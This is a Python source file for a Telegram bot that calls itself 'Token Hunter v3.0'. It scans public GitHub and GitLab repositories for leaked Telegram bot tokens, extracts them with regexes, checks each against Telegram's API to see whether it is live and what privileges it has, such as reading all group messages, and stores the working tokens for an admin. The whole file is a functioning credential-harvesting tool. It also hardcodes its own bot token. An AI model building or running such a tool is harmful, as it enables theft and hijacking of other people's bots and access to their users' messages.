import os, re, sqlite3, threading, time, requests, json, logging
from datetime import datetime, timedelta
from flask import Flask, jsonify
import telebot
from telebot import types

# =====================================
# কনফিগারেশন (তোমার তথ্য)
# =====================================
BOT_TOKEN = '8824547804:AAHIxlTU8o_E4-50p6YosWHcLm4EPeraYZ0'
ADMIN_IDS = [8210146346]
PORT = int(os.environ.get('PORT', 10000))

# ডাটাবেস পাথ (Render/Railway দুটোতেই কাজ করবে)
DB_PATH = '/data/token_hunter.db' if os.path.exists('/data') else '/tmp/token_hunter.db'

# লগিং
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# =====================================
# ডাটাবেস
# =====================================
def get_db():
    global DB_PATH
    if not os.path.exists('/data'):
        DB_PATH = '/tmp/token_hunter.db'
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH, timeout=20, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS found_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE NOT NULL,
        bot_username TEXT DEFAULT 'Unknown',
        bot_name TEXT DEFAULT 'Unknown',
        bot_id INTEGER DEFAULT 0,
        is_active INTEGER DEFAULT 0,
        source TEXT DEFAULT 'GitHub',
        repo_name TEXT DEFAULT 'Unknown',
        repo_url TEXT DEFAULT '',
        file_name TEXT DEFAULT '',
        can_join_groups INTEGER DEFAULT 0,
        can_read_all INTEGER DEFAULT 0,
        supports_inline INTEGER DEFAULT 0,
        has_commands INTEGER DEFAULT 0,
        last_checked TEXT DEFAULT '',
        found_date TEXT NOT NULL,
        status TEXT DEFAULT 'Found'
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS scan_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        source TEXT NOT NULL,
        items_scanned INTEGER DEFAULT 0,
        tokens_found INTEGER DEFAULT 0,
        tokens_active INTEGER DEFAULT 0,
        scan_date TEXT NOT NULL,
        duration_seconds REAL DEFAULT 0
    )""")
    conn.commit()
    conn.close()
    logger.info(f"✅ ডাটাবেস রেডি: {DB_PATH}")

# =====================================
# বট
# =====================================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

# =====================================
# টোকেন টেস্ট
# =====================================
def test_token(token):
    try:
        resp = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=8)
        if resp.status_code == 200 and resp.json().get('ok'):
            data = resp.json()['result']
            return {
                'username': data.get('username', 'Unknown'),
                'name': data.get('first_name', 'Unknown'),
                'id': data.get('id', 0),
                'can_join_groups': data.get('can_join_groups', False),
                'can_read_all': data.get('can_read_all_group_messages', False),
                'supports_inline': data.get('supports_inline_queries', False),
                'active': True
            }
        return None
    except:
        return None

# =====================================
# 🔍 রেজেক্স (SyntaxWarning মুক্ত)
# =====================================
def extract_tokens(content):
    tokens = []
    patterns = [
        r"(?:^|[^a-zA-Z0-9])(\d{8,10}:[A-Za-z0-9_-]{35,40})(?:$|[^a-zA-Z0-9_])",
        r"['\"`](\d{8,10}:[A-Za-z0-9_-]{35,40})['\"`]",
        r"(?:BOT_TOKEN|TOKEN|API_TOKEN|TELEGRAM|bot_token|api_key)\s*[=:]\s*['\"`]?(\d{8,10}:[A-Za-z0-9_-]{35,40})",
        r"(?:export\s+)?(?:BOT|TELEGRAM|API)_?(?:TOKEN|KEY)\s*[=:]\s*['\"`]?(\d{8,10}:[A-Za-z0-9_-]{35,40})",
    ]
    for pattern in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
        tokens.extend(matches)
    return list(set(t.strip() for t in tokens if re.match(r"^\d{8,10}:[A-Za-z0-9_-]{35,40}$", t.strip())))

# =====================================
# GitHub সার্চ
# =====================================
def search_github(max_results=30):
    results = []
    headers = {'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'Mozilla/5.0'}
    queries = ['telegram bot token language:python', 'telegram bot .env', 'telegram-bot filename:config']
    
    for q in queries[:2]:
        try:
            url = f"https://api.github.com/search/code?q={requests.utils.quote(q)}&per_page=20"
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                for item in resp.json().get('items', []):
                    repo = item['repository']
                    results.append({
                        'repo': repo['full_name'],
                        'repo_url': repo['html_url'],
                        'file': item['path'],
                    })
                    if len(results) >= max_results: return results
            time.sleep(0.3)
        except: continue
    return results

def get_file_content(repo, path):
    for branch in ['main', 'master']:
        try:
            resp = requests.get(f"https://raw.githubusercontent.com/{repo}/{branch}/{path}", timeout=8)
            if resp.status_code == 200: return resp.text
        except: continue
    return None

# =====================================
# 🚀 সার্চ ইঞ্জিন
# =====================================
def search_all_sources(uid):
    bot.send_message(uid, "🔍 *সব সোর্সে টোকেন খোঁজা শুরু...*\n\n⏳ ১-২ মিনিট লাগতে পারে...")
    start_time = time.time()
    all_tokens = {}
    sources_checked = 0
    
    # GitHub Code Search
    bot.send_message(uid, "📡 *GitHub স্ক্যান চলছে...*")
    for r in search_github(30):
        content = get_file_content(r['repo'], r['file'])
        if content:
            for t in extract_tokens(content):
                all_tokens[t] = {'source': 'GitHub', 'repo': r['repo'], 'repo_url': r['repo_url'], 'file': r['file']}
    sources_checked += 1
    
    # GitLab Search
    bot.send_message(uid, "📡 *GitLab স্ক্যান চলছে...*")
    try:
        resp = requests.get(f"https://gitlab.com/api/v4/projects?search={requests.utils.quote('telegram bot')}&per_page=10&order_by=last_activity_at", timeout=10)
        if resp.status_code == 200:
            for proj in resp.json():
                repo_name = proj.get('path_with_namespace', '')
                repo_url = proj.get('web_url', '')
                fr = requests.get(f"https://gitlab.com/api/v4/projects/{proj['id']}/repository/tree", timeout=8)
                if fr.status_code == 200:
                    for f in fr.json():
                        fname = f.get('name', '')
                        if any(fname.endswith(e) for e in ['.py', '.env', '.txt', '.json']):
                            raw = requests.get(f"https://gitlab.com/{repo_name}/-/raw/main/{fname}", timeout=8)
                            if raw.status_code == 200:
                                for t in extract_tokens(raw.text):
                                    all_tokens[t] = {'source': 'GitLab', 'repo': repo_name, 'repo_url': repo_url, 'file': fname}
    except: pass
    sources_checked += 1
    
    found = 0
    active = 0
    
    for token, info in all_tokens.items():
        bi = test_token(token)
        conn = get_db(); c = conn.cursor()
        try:
            if not c.execute("SELECT id FROM found_tokens WHERE token=?", (token,)).fetchone():
                now = datetime.now().isoformat()
                c.execute("""INSERT INTO found_tokens (token,bot_username,bot_name,bot_id,is_active,source,repo_name,repo_url,file_name,
                    can_join_groups,can_read_all,supports_inline,has_commands,last_checked,found_date,status) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                    (token, bi['username'] if bi else 'Unknown', bi['name'] if bi else 'Unknown', bi['id'] if bi else 0,
                     1 if bi else 0, info['source'], info['repo'], info['repo_url'], info['file'],
                     bi['can_join_groups'] if bi else 0, bi['can_read_all'] if bi else 0, bi['supports_inline'] if bi else 0,
                     0, now, now, 'Active' if bi else 'Inactive'))
                found += 1
                if bi: active += 1
        except: pass
        conn.commit(); conn.close()
    
    dur = time.time() - start_time
    
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO scan_history (source,items_scanned,tokens_found,tokens_active,scan_date,duration_seconds) VALUES(?,?,?,?,?,?)",
              ('All', len(all_tokens), found, active, datetime.now().isoformat(), dur))
    conn.commit(); conn.close()
    
    bot.send_message(uid,
        f"✅ *স্ক্যান সম্পন্ন!*\n\n"
        f"📡 সোর্স: {sources_checked}টি\n"
        f"🔍 নতুন: {found}টি\n"
        f"✅ Active: {active}\n"
        f"❌ বন্ধ: {found-active}\n"
        f"⏱ সময়: {dur:.1f}s")
    
    # Active বট দেখাও
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT * FROM found_tokens WHERE is_active=1 ORDER BY found_date DESC LIMIT 10")
    for b in c.fetchall():
        bot.send_message(uid, f"✅ @{b['bot_username']} — {b['source']}")
    conn.close()

# =====================================
# /start
# =====================================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS: return bot.reply_to(message, "⛔ অননুমোদিত!")
    
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM found_tokens"); total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM found_tokens WHERE is_active=1"); active = c.fetchone()[0]
    conn.close()
    
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("🔍 সার্চ শুরু করো", "🤖 ফাউন্ড বট", "✅ Active বট", "📊 স্ট্যাটাস", "🔄 রি-টেস্ট সব")
    
    bot.send_message(uid,
        f"🔥 *টোকেন হান্টার বট v3.0*\n\n"
        f"✅ GitHub + GitLab থেকে টোকেন খোঁজে\n"
        f"✅ অটো টেস্ট করে দেখে\n\n"
        f"📊 🤖 {total}টি | ✅ {active}টি Active\n\n"
        f"🔽 বাটন ব্যবহার করুন:", reply_markup=kb)

# =====================================
# হ্যান্ডলার
# =====================================
@bot.message_handler(func=lambda m: True)
def handle(m):
    uid = m.from_user.id
    if uid not in ADMIN_IDS: return bot.reply_to(m, "⛔ অননুমোদিত!")
    t = m.text
    
    if t == "🔍 সার্চ শুরু করো": search_all_sources(uid)
    elif t == "🤖 ফাউন্ড বট":
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM found_tokens ORDER BY found_date DESC LIMIT 30")
        bots = c.fetchall(); conn.close()
        if not bots: return bot.send_message(uid, "❌ কিছু নেই!")
        txt = "🤖 *সব বট:*\n\n"
        for b in bots:
            txt += f"{'✅' if b['is_active'] else '❌'} @{b['bot_username']} | {b['source']}\n"
        bot.send_message(uid, txt[:4000])
    
    elif t == "✅ Active বট":
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM found_tokens WHERE is_active=1 ORDER BY found_date DESC")
        bots = c.fetchall(); conn.close()
        if not bots: return bot.send_message(uid, "❌ কোনো Active বট নেই!")
        txt = f"✅ *Active: {len(bots)}টি*\n\n"
        for b in bots:
            txt += f"✅ @{b['bot_username']}\n   🔑 `{b['token'][:8]}...{b['token'][-5:]}`\n\n"
        bot.send_message(uid, txt[:4000])
    
    elif t == "📊 স্ট্যাটাস":
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM found_tokens"); total = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM found_tokens WHERE is_active=1"); active = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM scan_history"); scans = c.fetchone()[0]
        c.execute("SELECT source, COUNT(*) as cnt FROM found_tokens GROUP BY source ORDER BY cnt DESC")
        srcs = c.fetchall(); conn.close()
        txt = f"📊 *স্ট্যাটাস*\n\n🤖 মোট: {total}\n✅ Active: {active}\n❌ বন্ধ: {total-active}\n🔍 স্ক্যান: {scans} বার\n\n📡 সোর্স:\n"
        for s in srcs: txt += f"   • {s['source']}: {s['cnt']}টি\n"
        bot.send_message(uid, txt)
    
    elif t == "🔄 রি-টেস্ট সব":
        bot.send_message(uid, "⏳ *রি-টেস্ট হচ্ছে...*")
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT * FROM found_tokens"); bots = c.fetchall(); conn.close()
        a = i = 0
        for b in bots:
            bi = test_token(b['token']); conn = get_db(); c = conn.cursor()
            if bi:
                c.execute("UPDATE found_tokens SET is_active=1, bot_username=?, bot_name=?, bot_id=?, can_join_groups=?, can_read_all=?, supports_inline=?, last_checked=?, status=? WHERE id=?", (bi['username'], bi['name'], bi['id'], bi['can_join_groups'], bi['can_read_all'], bi['supports_inline'], datetime.now().isoformat(), 'Active', b['id']))
                a += 1
            else:
                c.execute("UPDATE found_tokens SET is_active=0, last_checked=?, status='Inactive' WHERE id=?", (datetime.now().isoformat(), b['id']))
                i += 1
            conn.commit(); conn.close()
        bot.send_message(uid, f"✅ *রি-টেস্ট সম্পন্ন!*\n✅ Active: {a}\n❌ বন্ধ: {i}")

# =====================================
# ফ্লাস্ক
# =====================================
app = Flask(__name__)

@app.route('/')
def home():
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM found_tokens"); total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM found_tokens WHERE is_active=1"); active = c.fetchone()[0]
    conn.close()
    return jsonify({"status": "Running", "total_bots": total, "active_bots": active})

@app.route('/health')
def health():
    return jsonify({"ok": True})

# =====================================
# বট থ্রেড
# =====================================
def run_bot():
    logger.info("🚀 বট চালু...")
    while True:
        try: bot.infinity_polling(timeout=60, skip_pending=True)
        except: time.sleep(3)

# =====================================
# মেইন
# =====================================
if __name__ == '__main__':
    print("🔥 টোকেন হান্টার বট v3.0 চালু হচ্ছে...")
    init_db()
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
